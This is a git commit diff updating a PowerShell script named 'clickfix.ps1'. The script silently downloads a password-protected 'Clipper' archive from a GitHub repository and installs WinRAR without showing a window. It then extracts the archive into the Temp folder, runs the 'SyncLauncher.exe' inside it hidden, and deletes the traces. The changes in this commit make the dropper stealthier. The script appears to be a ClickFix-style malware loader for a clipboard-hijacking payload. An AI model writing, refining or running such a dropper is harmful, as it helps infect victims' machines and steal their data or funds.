5033f91b6073bb05afba274309f63de59a8f323f
0xL10NZ <0xL10NZ@disroot.org>
2025-06-26 14:03:52 -0700

    Update clickfix.ps1

--- clickfix.ps1
+++ clickfix.ps1
@@ -1,30 +1,34 @@
 $ErrorActionPreference = "SilentlyContinue"
 
 # Paths
-$zipUrl = "https://github.com/0xL10NZ/clickfix-files/raw/refs/heads/main/Clipper.zip"
-$downloadPath = "$env:USERPROFILE\Desktop\Clipper.zip"
-$extractPath = "$env:USERPROFILE\Desktop\Clipper"
+$rarUrl = "https://github.com/0xL10NZ/clickfix-files/raw/refs/heads/main/Clipper.rar"
+$downloadPath = "$env:USERPROFILE\AppData\Local\Temp\Clipper.rar"
+$extractPath = "$env:USERPROFILE\AppData\Local\Temp\Clipper"
 $exePath = "$extractPath\SyncLauncher.exe"
 
-# Download Clipper.zip silently
-Invoke-WebRequest -Uri $zipUrl -OutFile $downloadPath -UseBasicParsing
+# Download Clipper.rar silently
+$client = New-Object System.Net.WebClient
+$client.DownloadFile($rarUrl, $downloadPath)
 
 # Check if WinRAR is installed
 $winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"
 if (-not (Test-Path $winrarPath)) {
     $winrarInstallerUrl = "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe"
-    $winrarInstallerPath = "$env:USERPROFILE\Desktop\winrar.exe"
-    Invoke-WebRequest -Uri $winrarInstallerUrl -OutFile $winrarInstallerPath -UseBasicParsing
-    Start-Process -FilePath $winrarInstallerPath -ArgumentList "/S" -Wait -NoNewWindow
+    $winrarInstallerPath = "$env:USERPROFILE\AppData\Local\Temp\winrar.exe"
+    $client.DownloadFile($winrarInstallerUrl, $winrarInstallerPath)
+    Start-Process -FilePath $winrarInstallerPath -ArgumentList "/S" -Wait -NoNewWindow -WindowStyle Hidden
     Remove-Item $winrarInstallerPath -Force
 }
 
-# Extract Clipper.zip silently
+# Extract Clipper.rar silently
 if (Test-Path $extractPath) {
     Remove-Item -Recurse -Force $extractPath
 }
 New-Item -ItemType Directory -Path $extractPath | Out-Null
-Start-Process -FilePath $winrarPath -ArgumentList "x -p12345 $downloadPath * $extractPath\" -Wait -NoNewWindow
+Start-Process -FilePath $winrarPath -ArgumentList "x -p12345 -inul $downloadPath * $extractPath\" -Wait -NoNewWindow -WindowStyle Hidden
 
 # Run SyncLauncher.exe silently
-Start-Process -FilePath $exePath -NoNewWindow
+Start-Process -FilePath $exePath -NoNewWindow -WindowStyle Hidden
+
+# Clean up
+Remove-Item $downloadPath -Force
